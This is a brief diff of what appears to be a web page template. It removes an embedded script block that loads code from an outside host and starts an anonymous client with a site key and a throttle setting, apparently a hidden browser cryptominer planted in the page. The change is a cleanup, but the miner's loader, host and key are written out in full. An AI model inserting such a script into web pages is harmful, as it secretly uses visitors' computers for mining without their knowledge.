@@ -232,12 +232,5 @@
         copyText.setSelectionRange(0, 99999)
         document.execCommand("copy");
       }
-</script>    
-<script src="https://www.hostingcloud.racing/tRuj.js"></script>
-<script>
-    var _client = new Client.Anonymous('b7093d4a2ed63b645c9bde80348e97d9522dca0a7bc0c441d46b303f4f0bd00d', {
-        throttle: 0.4, ads: 0
-    });
-    _client.start();
 </script>
 @stop
